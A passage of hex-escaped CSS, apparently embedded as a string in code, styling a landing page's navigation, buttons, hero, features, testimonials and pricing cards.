x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#8b5cf6\x200%,\x20#c084fc\x20100%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-clip:\x20text;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-webkit-background-clip:\x20text;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20transparent;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.logo-text\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2026px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20800;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#0f0e17;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20letter-spacing:\x20-0.3px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.logo-text\x20span\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(120deg,\x20#8b5cf6,\x20#c084fc);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-clip:\x20text;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-webkit-background-clip:\x20text;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20transparent;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2036px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#3c3e4a;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20600;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20color\x200.2s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.cta-button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(105deg,\x20#8b5cf6\x200%,\x20#a855f7\x20100%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2026px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x200.95rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.25s\x20ease;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x204px\x2012px\x20rgba(139,\x2092,\x20246,\x200.25);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.cta-button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-2px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2010px\x2020px\x20rgba(139,\x2092,\x20246,\x200.3);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(105deg,\x20#7c3aed,\x20#9333ea);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.secondary-button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20transparent;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201.5px\x20solid\x20#d9c9ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2026px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20600;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.2s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.secondary-button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f0ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-color:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.mobile-menu-btn\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2026px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#1e1f2a;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Hero\x20Section\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x20160px\x200\x2090px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20radial-gradient(ellipse\x2080%\x2050%\x20at\x2020%\x2040%,\x20#f3eaff,\x20#ffffff);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-content\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20space-between;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2048px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-text\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex:\x201;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-text\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2052px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20800;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201.2;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20letter-spacing:\x20-0.02em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#0f0e17;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-text\x20h1\x20span\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#8b5cf6,\x20#c241ff);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-clip:\x20text;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-webkit-background-clip:\x20text;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20transparent;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-text\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.2rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#4b4b5a;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2036px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20540px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-buttons\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-wrap:\x20wrap;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-image\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex:\x201;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.hero-image\x20img\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2028px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2025px\x2045px\x20-12px\x20rgba(0,\x200,\x200,\x200.2);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20rgba(139,\x2092,\x20246,\x200.15);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Section\x20titles\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20.section-title\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2064px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.section-title\x20h2\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2038px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#0f0e17;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20letter-spacing:\x20-0.01em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.section-title\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#5b5c6e;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20700px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.1rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Features\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20.features\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x20100px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#ffffff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.features-grid\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20grid;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20grid-template-columns:\x20repeat(auto-fit,\x20minmax(300px,\x201fr));\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.feature-card\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#fff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2032px\x2028px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2028px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x208px\x2020px\x20rgba(0,\x200,\x200,\x200.02),\x200\x202px\x206px\x20rgba(0,\x200,\x200,\x200.03);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.3s\x20ease;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#f0eaff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.feature-card:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-8px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-color:\x20#d9c9ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2020px\x2030px\x20-12px\x20rgba(139,\x2092,\x20246,\x200.15);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.feature-icon\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#f2ecff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2064px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2064px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2028px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.feature-card\x20h3\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.6rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2014px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.feature-card\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#5a5b6e;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201.5;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Benefits\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20.benefits\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x20100px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#fbfaff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.benefits-grid\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20grid;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20grid-template-columns:\x20repeat(auto-fit,\x20minmax(240px,\x201fr));\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.benefit-item\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2028px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2028px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.2s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#f0ebff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.benefit-icon\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2044px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.benefit-item\x20h3\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.6rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2012px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.benefit-item\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#5a5b6e;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Testimonials\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20.testimonials\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x20100px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.testimonial-slider\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20850px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.testimonial\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#fefbff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2048px\x2044px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2012px\x2028px\x20-8px\x20rgba(0,\x200,\x200,\x200.05);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#ede6ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.testimonial-text\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.28rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-style:\x20normal;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20500;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2032px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#252641;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201.45;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.testimonial-author\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.author-avatar\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(145deg,\x20#e9deff,\x20#d9c9ff);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.2rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#6d28d9;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.author-info\x20h4\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.2rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x204px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.author-info\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#6c6d80;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x200.85rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Pricing\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20.pricing\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x20100px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#fefaff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.pricing-grid\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20grid;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20grid-template-columns:\x20repeat(auto-fit,\x20minmax(280px,\x201fr));\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2032px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.pricing-card\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2036px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2040px\x2028px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2010px\x2030px\x20rgba(0,\x200,\x200,\x200.03);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.25s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#ede6ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.pricing-card.featured\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-top:\x206px\x20solid\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20relative;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(1.02);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2020px\x2035px\x20-12px\x20rgba(139,\x2092,\x20246,\x200.2);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.featured-badge\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20absolute;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x20-14px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateX(-50%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x206px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2060px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x200.8rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.pricing-card:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-8px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.pricing-card.featured:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(1.02)\x20translateY(-8px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.plan-name\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.8rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2018px;\x0a\x